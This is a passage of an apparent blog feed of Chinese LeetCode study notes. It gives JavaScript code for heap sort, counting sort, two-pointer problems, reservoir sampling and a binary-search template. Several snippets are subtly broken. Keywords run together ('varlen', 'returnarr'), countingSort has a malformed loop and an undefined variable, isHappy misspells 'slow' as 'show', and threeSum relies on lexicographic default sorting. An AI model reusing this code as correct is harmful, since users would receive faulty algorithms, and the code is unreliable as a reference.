class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> temp = arr[i]</span><br><span class="line">  arr[i] = arr[j]</span><br><span class="line">  arr[j] = temp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/19/Leetcode-排序/5.gif"></p><p><br></p><h3 id="6-堆排序"><a href="#6-堆排序" class="headerlink" title="6. 堆排序"></a>6. 堆排序</h3><p>大顶堆和小顶堆，就是我们想要的数据结构。它总是保持着堆顶元素是最大/最小的。这里假设我们已经实现了<em>大顶堆</em>和<em>小顶堆</em>，它允许初始化一个数组，对数组中的元素进行堆排序。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">varlen;   <span class="comment">// 因为声明的多个函数都需要数据长度，所以把len设置成为全局变量</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildMaxHeap</span>(<span class="params">arr</span>) </span>&#123;  <span class="comment">// 建立大顶堆</span></span><br><span class="line">  len = arr.length;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="built_in">Math</span>.floor(len/<span class="number">2</span>); i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    heapify(arr, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapify</span>(<span class="params">arr, i</span>) </span>&#123;    <span class="comment">// 堆调整</span></span><br><span class="line">  <span class="keyword">var</span> left = <span class="number">2</span> * i + <span class="number">1</span>,</span><br><span class="line">      right = <span class="number">2</span> * i + <span class="number">2</span>,</span><br><span class="line">      largest = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;</span><br><span class="line">    largest = left;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;</span><br><span class="line">    largest = right;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(largest != i) &#123;</span><br><span class="line">    swap(arr, i, largest);</span><br><span class="line">    heapify(arr, largest);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, i, j</span>) </span>&#123;</span><br><span class="line">  vartemp = arr[i];</span><br><span class="line">  arr[i] = arr[j];</span><br><span class="line">  arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heapSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  buildMaxHeap(arr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(vari = arr.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">    swap(arr, <span class="number">0</span>, i);</span><br><span class="line">    len--;</span><br><span class="line">    heapify(arr, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  returnarr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="O-n"><a href="#O-n" class="headerlink" title="O(n)"></a><code>O(n)</code></h3><h3 id="7-计数排序"><a href="#7-计数排序" class="headerlink" title="7. 计数排序"></a>7. 计数排序</h3><p>计数排序要求输入的数据必须是有确定范围的整数。其核心是将输入的数据值化为键存储在数组中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countingSort</span> (<span class="params">arr, maxValue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> bucket = <span class="keyword">new</span> <span class="built_in">Array</span>(maxValue + <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">let</span> sortedIndex = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (bucket[arr[i]]) &#123;</span><br><span class="line">      bucket[arr[i]] = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    bucket[arr[i]]++</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bucket.length; i+) &#123;</span><br><span class="line">    <span class="keyword">while</span> (bucket[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      arr[sortedIndex] = j</span><br><span class="line">      sortedIndex++</span><br><span class="line">      bucket[j]--</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="8-桶排序"><a href="#8-桶排序" class="headerlink" title="8. 桶排序"></a>8. 桶排序</h3><p>假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序。</p><h3 id="9-基数排序"><a href="#9-基数排序" class="headerlink" title="9. 基数排序"></a>9. 基数排序</h3><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.cnblogs.com/onepixel/p/7674659.html" target="_blank" rel="noopener">十大经典排序算法（动图演示）</a></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>双指针</title>
      <link href="/2021/08/19/Leetcode-%E5%8F%8C%E6%8C%87%E9%92%88/"/>
      <url>/2021/08/19/Leetcode-%E5%8F%8C%E6%8C%87%E9%92%88/</url>
      <content type="html"><![CDATA[<h3 id="1-双指针-TwoPoints"><a href="#1-双指针-TwoPoints" class="headerlink" title="1. 双指针 TwoPoints"></a>1. 双指针 TwoPoints</h3><p>双指针，是指用两个变量在线性结构上遍历而解决的问题。双指针算法是基于暴力解法的优化。</p><ul><li>对于数组，指两个变量在数组上相向移动解决的问题</li><li>对于链表，指两个变量在链表上同向移动解决的问题，也称为「快慢指针」问题</li></ul><p><br></p><h3 id="2-题目类型"><a href="#2-题目类型" class="headerlink" title="2. 题目类型"></a>2. 题目类型</h3><table><thead><tr><th>类型</th><th style="text-align:right">LeetCode题目</th></tr></thead><tbody><tr><td>左右指针夹逼</td><td style="text-align:right">1.两数之和、125.验证回文串、11.盛最多水的容器、15.三数之和、 18.四数之和</td></tr><tr><td>快慢指针</td><td style="text-align:right">141.环形链表、202.快乐数</td></tr></tbody></table><p><br></p><h3 id="3-左右指针夹逼"><a href="#3-左右指针夹逼" class="headerlink" title="3. 左右指针夹逼"></a>3. 左右指针夹逼</h3><p>左右指针分别指向左右两端，根据情况向中间移动。适用于<strong>两数之和</strong>，<strong>三数之和</strong>，<strong>四数之和</strong>, <strong>盛最多水的容器</strong>这样的LeetCode题目，先对数组进行排序，然后左右夹逼求值。</p><p><br></p><h4 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a>1. 两数之和</h4><p>给定一个有序整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target 的那两个整数，并返回它们的数组下标。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++ ) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++ ) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[i] + nums[j] === target) &#123;</span><br><span class="line">        <span class="keyword">return</span> [i, j]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a>15. 三数之和</h4><p>给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？请你找出所有和为 0 且不重复的三元组。</p><ul><li>暴力：三重循环，使用Set进行判重（会超出时间限制）<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> threeSum = <span class="function"><span class="params">nums</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (nums === <span class="literal">null</span> || nums.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">  &#125;</span><br><span class="line">  nums = nums.sort()</span><br><span class="line">  <span class="keyword">const</span> result = []</span><br><span class="line">  <span class="keyword">const</span> resultSet = <span class="keyword">new</span> <span class="built_in">Set</span>() <span class="comment">// 用作判重</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; nums.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> k = j + <span class="number">1</span>; k &lt; nums.length; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] + nums[j] + nums[k] === <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> temp = [nums[i], nums[j], nums[k]]</span><br><span class="line">          <span class="keyword">if</span> (!resultSet.has(temp.join())) &#123;</span><br><span class="line">            result.push(temp)</span><br><span class="line">            resultSet.add(temp.join())</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="125-验证回文串"><a href="#125-验证回文串" class="headerlink" title="125.验证回文串"></a>125.验证回文串</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  str = str.replace(<span class="regexp">/[^0-9a-zA-Z]/g</span>, <span class="string">''</span>).toLowerCase()</span><br><span class="line">  <span class="keyword">let</span> l = <span class="number">0</span>, r = str.length - <span class="number">1</span> <span class="comment">// 头尾指针</span></span><br><span class="line">  <span class="keyword">while</span> (l &lt; r) &#123; </span><br><span class="line">    <span class="keyword">if</span> (str[l] != str[r]) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    l++</span><br><span class="line">    r--</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11.盛最多水的容器"></a>11.盛最多水的容器</h4><p>左右指针分别指向左右两端，总是移动数字较小的那个指针，得出最大值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> maxArea = <span class="function"><span class="params">height</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span>; <span class="comment">// 左指针</span></span><br><span class="line">  <span class="keyword">let</span> j = height.length - <span class="number">1</span>; <span class="comment">// 右指针</span></span><br><span class="line">  <span class="keyword">let</span> area = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">    area = <span class="built_in">Math</span>.max(<span class="built_in">Math</span>.min(height[i], height[j]) * (j - i), area)</span><br><span class="line">    <span class="keyword">if</span> (height[i] &lt; height[j]) &#123;</span><br><span class="line">      i++</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      j--</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> area</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>时间复杂度：O(n)</p><p><br></p><h4 id="15-三数之和-1"><a href="#15-三数之和-1" class="headerlink" title="15.三数之和"></a>15.三数之和</h4><p>枚举k，k确定后，让 <code>nums[i] + nums[j] + nums[k] = 0</code>。<br>因为k右侧的数组始终是单调递增的，双指针i j一个在头，一个在尾。如果<code>sum &lt; 0</code>, 左指针i往右移。如果<code>sum &gt; 0</code>, 右指针j往左移<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -4 -1 -1 -1 0 1 2</span></span><br><span class="line"><span class="comment">// k  i            j</span></span><br><span class="line"><span class="keyword">const</span> threeSum = <span class="function"><span class="params">nums</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = []</span><br><span class="line">  nums = nums.sort()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k = <span class="number">0</span>; k &lt; nums.length - <span class="number">2</span>; k++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[k] &gt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (k &gt; <span class="number">0</span> &amp;&amp; nums[k] == nums[k - <span class="number">1</span>]) <span class="keyword">continue</span>; <span class="comment">// 跳过重复的k值</span></span><br><span class="line">    <span class="keyword">let</span> i = k + <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> j = nums.length - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">const</span> sum = nums[k] + nums[i] + nums[j]</span><br><span class="line">      <span class="keyword">if</span> (sum === <span class="number">0</span>) &#123;</span><br><span class="line">        arr.push([nums[k], nums[i], nums[j]])</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] === nums[++i]) &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] === nums[--j]) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] === nums[++i]) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] === nums[--j]) &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><ul><li>夹逼法：排序之后，双指针进行左右夹逼<br>枚举k，k确定后，让 <code>nums[i] + nums[j] + nums[k] = 0</code>。</li></ul><p>-4 -1 -1 -1 0 1 2<br>k  i            j</p><p>因为k右侧的数组始终是单调递增的，双指针i j一个在头，一个在尾。如果<code>sum &lt; 0</code>, 左指针i往右移。如果<code>sum &gt; 0</code>, 右指针j往左移<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> threeSum = <span class="function"><span class="params">nums</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = []</span><br><span class="line">  nums = nums.sort()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k = <span class="number">0</span>; k &lt; nums.length - <span class="number">2</span>; k++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[k] &gt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (k &gt; <span class="number">0</span> &amp;&amp; nums[k] == nums[k - <span class="number">1</span>]) <span class="keyword">continue</span>; <span class="comment">// 跳过重复的k值</span></span><br><span class="line">    <span class="keyword">let</span> i = k + <span class="number">1</span></span><br><span class="line">    <span class="keyword">let</span> j = nums.length - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">const</span> sum = nums[k] + nums[i] + nums[j]</span><br><span class="line">      <span class="keyword">if</span> (sum === <span class="number">0</span>) &#123;</span><br><span class="line">        arr.push([nums[k], nums[i], nums[j]])</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] === nums[++i]) &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] === nums[--j]) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] === nums[++i]) &#123;&#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] === nums[--j]) &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> arr</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-快慢指针"><a href="#4-快慢指针" class="headerlink" title="4. 快慢指针"></a>4. 快慢指针</h3><p>链表中使用快慢指针一般用于判断是否为环形链表</p><h4 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141.环形链表"></a>141.环形链表</h4><p>给定一个链表，判断链表中是否有环。使用O(1)内存解决此问题。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!head || !head.next) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">let</span> slow = head</span><br><span class="line">  <span class="keyword">let</span> fast = head.next</span><br><span class="line">  <span class="keyword">while</span> (slow !== fast) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!fast || !fast.next) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    slow = slow.next</span><br><span class="line">    fast = fast.next.next</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="202-快乐数"><a href="#202-快乐数" class="headerlink" title="202.快乐数"></a>202.快乐数</h4><ul><li>找到快乐数</li><li>没有快乐数，形成环路，造成死循环<br>创建快慢指针，慢指针每次走一步，快指针每次走两步。当快慢指针相遇，表示有环路，该数不是快乐数<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getNext = <span class="function"><span class="params">n</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> n.toString().split(<span class="string">''</span>).map(<span class="function"><span class="params">v</span> =&gt;</span> v ** <span class="number">2</span>).reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isHappy = <span class="function"><span class="params">n</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> show = n</span><br><span class="line">  <span class="keyword">let</span> fast = getNext(n)</span><br><span class="line">  <span class="keyword">while</span> (fast !== <span class="number">1</span> &amp;&amp; fast !== slow) &#123;</span><br><span class="line">    slow = getNext(slow)</span><br><span class="line">    fast = getNext(getNext(fast))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fast === <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>随机抽样</title>
      <link href="/2021/08/19/Leetcode-%E9%9A%8F%E6%9C%BA%E6%8A%BD%E6%A0%B7/"/>
      <url>/2021/08/19/Leetcode-%E9%9A%8F%E6%9C%BA%E6%8A%BD%E6%A0%B7/</url>
      <content type="html"><![CDATA[<h3 id="蓄水池抽样"><a href="#蓄水池抽样" class="headerlink" title="蓄水池抽样"></a>蓄水池抽样</h3><p>当内存无法加载全部数据时，如何从包含未知大小的数据流中随机选取k个数据，并且要保证每个数据被抽取到的概率相等。</p><p>蓄水池抽样是一系列的随机算法，其目的在于集合 n 中选取 k 个样本，其中 n 为一很大或未知的数量，尤其适用于不能把所有 n 个项目都存放到内存的情况。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>二分查找</title>
      <link href="/2021/08/19/Leetcode-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
      <url>/2021/08/19/Leetcode-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
      <content type="html"><![CDATA[<blockquote><p>在 42 亿个有序数据中用<strong>二分查找</strong>一个数据，最多需要比较 32 次。二分查找是一个时间复杂度为 O(logn) 的算法。logn 非常“恐怖”，即便 n 非常非常大，对应的 logn 也很小。</p></blockquote><h3 id="1-二分查找-Binary"><a href="#1-二分查找-Binary" class="headerlink" title="1. 二分查找 Binary"></a>1. 二分查找 Binary</h3><p>二分查找针对的是一个有序的数据集合，每次都通过跟区间的中间元素对比，将待查找的区间缩小为之前的一半，直到找到要查找的元素，或者区间被缩小为 0。</p><ul><li><p>被查找区间的大小变化<br>n, n/2, n/4, n/8 … n/2^k</p></li><li><p>使用场景</p><ul><li>目标函数单调性（单调递增或者递减）</li><li>存在上下界</li><li>能够通过索引访问</li></ul></li></ul><p><br></p><h3 id="2-代码模板"><a href="#2-代码模板" class="headerlink" title="2.代码模板"></a>2.代码模板</h3><p>LeetCode里关于二分查找的题木，几乎可以套用这个代码模板。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> binarySearch = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">    <span class="keyword">let</span> mid = left + ((right - left) &gt;&gt; <span class="number">1</span>) <span class="comment">// 相当于 Math.floor(left + (right - left) / 2)</span></span><br><span class="line">    <span class="keyword">if</span> (nums[mid] === target) &#123;</span><br><span class="line">      <span class="keyword">return</span> mid</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">      left = mid + <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      right = mid - <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-LeetCode题目"><a href="#3-LeetCode题目" class="headerlink" title="3. LeetCode题目"></a>3. LeetCode题目</h3><p>主要包括这3类 <strong>(点击查看完整代码)</strong></p><ol><li>简单的有序数组中查找元素</li></ol><table><thead><tr><th>类型</th><th style="text-align:center">LeetCode题目</th></tr></thead><tbody><tr><td>有序数组中不存在重复元素</td><td style="text-align:center"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/704.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.md" target="_blank" rel="noopener">704. 二分查找</a></td></tr><tr><td>查找第一个值，最后一个等于给定值的元素</td><td style="text-align:center"><a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/34.%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%92%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E4%BD%8D%E7%BD%AE.md" target="_blank" rel="noopener">34.在排序数组中查找元素的第一个和最后一个位置</a>  <br> <a href="https://github.com/ufresh2013/-algorithm015/blob/master/BinarySearch/Offer53-%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%A5%E6%89%BE%E6%95%B0%E5%AD%97I.md" target="_blank" rel="noopener">Offer53.在排序数组中查找数字I</a></td></tr><tr><td>查找第一个大于等于给定值的元素、查找最后一个小于等于给定值的元素</td><td style="text-align:center"><a 